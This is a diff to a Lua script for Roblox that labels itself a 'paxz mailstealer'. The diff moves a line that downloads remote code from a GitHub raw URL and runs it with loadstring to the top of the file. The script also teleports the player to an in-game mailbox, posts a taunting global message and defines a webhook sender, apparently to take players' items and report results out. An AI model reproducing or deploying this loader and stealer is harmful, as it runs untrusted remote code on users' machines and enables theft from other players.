@@ -1,4 +1,7 @@
 --paxz mailstealer
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Loading%20screen"))()
+
 local message = "Paxz was here :)"
 
 local function sendGlobalMessage()
@@ -19,8 +22,6 @@ local workspace = game:GetService("Workspace")
 local mailbox = workspace["__MAP"].Interactive.Mailbox.Pad
 local mailboxCFrame = mailbox.CFrame
 rootPart.CFrame = mailboxCFrame
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Loading%20screen"))()
 
 function sendWebhook(webhook, message)
     local webhookcheck =
